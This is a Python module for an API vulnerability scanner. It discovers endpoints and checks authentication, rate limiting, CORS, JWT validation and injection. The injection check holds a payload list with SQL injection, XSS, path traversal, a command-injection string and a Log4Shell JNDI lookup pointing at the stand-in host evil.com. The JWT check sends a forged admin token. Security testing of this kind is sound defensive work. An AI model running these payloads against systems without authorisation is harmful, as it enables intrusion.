"""
API Security Scanner Module
"""

import re
import requests
import json
from urllib.parse import urlparse

class APIScanner:
    def __init__(self, base_url, session):
        self.base_url = base_url.rstrip('/')
        self.domain = urlparse(base_url).netloc
        self.session = session
        self.findings = []
        
    def detect_api_endpoints(self):
        """Detect API endpoints"""
        endpoints = []
        common_paths = [
            '/api', '/api/', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/', '/rest/v1', '/rest/v2',
            '/api/users', '/api/products', '/api/items',
            '/api/auth', '/api/login', '/api/register',
            '/api/admin', '/api/data', '/api/search',
            '/graphql', '/graphiql',
        ]
        
        for path in common_paths:
            test_url = f"{self.base_url}{path}"
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code in [200, 201, 401, 403]:
                    endpoints.append(test_url)
            except:
                continue
        
        return endpoints

    def test_authentication(self, endpoint):
        """Test API authentication"""
        findings = []
        
        try:
            # Test without authentication
            response = self.session.get(endpoint, timeout=10)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, list) or (isinstance(data, dict) and 'data' in data):
                        findings.append({
                            'type': 'API Security',
                            'severity': 'High',
                            'title': 'API endpoint accessible without authentication',
                            'description': f'API endpoint at {endpoint} returns data without authentication.',
                            'url': endpoint,
                            'remediation': 'Implement proper authentication and authorization for all API endpoints. Use API keys, JWT tokens, or OAuth.'
                        })
                except:
                    pass
        except:
            pass
        
        return findings

    def test_rate_limiting(self, endpoint):
        """Test for API rate limiting"""
        findings = []
        
        try:
            # Send multiple rapid requests
            for i in range(50):
                response = self.session.get(endpoint, timeout=5)
                if response.status_code == 429:
                    return []  # Rate limiting is in place
            
            # If all 50 requests succeeded, no rate limiting
            findings.append({
                'type': 'API Security',
                'severity': 'Medium',
                'title': 'API rate limiting not detected',
                'description': f'API endpoint at {endpoint} does not appear to have rate limiting enabled.',
                'url': endpoint,
                'remediation': 'Implement rate limiting to prevent API abuse and DoS attacks. Use token bucket or sliding window algorithms.'
            })
        except:
            pass
        
        return findings

    def test_injection(self, endpoint):
        """Test for injection vulnerabilities in API"""
        findings = []
        
        injection_payloads = [
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            ";ls",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for payload in injection_payloads:
            try:
                response = self.session.get(endpoint, params={'test': payload}, timeout=10)
                
                if payload in response.text:
                    findings.append({
                        'type': 'API Security',
                        'severity': 'High',
                        'title': 'API injection vulnerability detected',
                        'description': f'API endpoint at {endpoint} is vulnerable to injection attacks.',
                        'url': endpoint,
                        'payload': payload,
                        'remediation': 'Implement proper input validation and sanitization. Use parameterized queries. Employ API security testing tools.'
                    })
                    break
            except:
                continue
        
        return findings

    def test_cors(self, endpoint):
        """Test CORS configuration"""
        findings = []
        
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'GET',
            }
            
            response = self.session.get(endpoint, headers=headers, timeout=10)
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == '*' or 'evil.com' in acao:
                findings.append({
                    'type': 'API Security',
                    'severity': 'Medium',
                    'title': 'Overly permissive CORS policy',
                    'description': f'API at {endpoint} has overly permissive CORS configuration.',
                    'url': endpoint,
                    'remediation': 'Configure CORS properly. Only allow trusted origins. Avoid wildcard (*) with credentials.'
                })
        except:
            pass
        
        return findings

    def test_jwt_issues(self, endpoint):
        """Test for JWT issues"""
        findings = []
        
        try:
            # Test with empty JWT
            headers = {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MzQ1Njc4OTB9.invalid'}
            
            response = self.session.get(endpoint, headers=headers, timeout=10)
            
            if response.status_code == 200:
                findings.append({
                    'type': 'API Security',
                    'severity': 'High',
                    'title': 'JWT validation bypass',
                    'description': f'API at {endpoint} accepts invalid or expired JWT tokens.',
                    'url': endpoint,
                    'remediation': 'Implement proper JWT validation. Verify signature, expiration, and claims. Use strong secret keys.'
                })
        except:
            pass
        
        return findings

    def scan(self):
        """Main scanning function"""
        try:
            # Detect API endpoints
            endpoints = self.detect_api_endpoints()
            
            for endpoint in endpoints:
                # Test authentication
                findings = self.test_authentication(endpoint)
                self.findings.extend(findings)
                
                # Test rate limiting
                findings = self.test_rate_limiting(endpoint)
                self.findings.extend(findings)
                
                # Test injection
                findings = self.test_injection(endpoint)
                self.findings.extend(findings)
                
                # Test CORS
                findings = self.test_cors(endpoint)
                self.findings.extend(findings)
                
                # Test JWT issues
                findings = self.test_jwt_issues(endpoint)
                self.findings.extend(findings)
                
        except Exception as e:
            print(f"API scanning error: {e}")
        
        return self.findings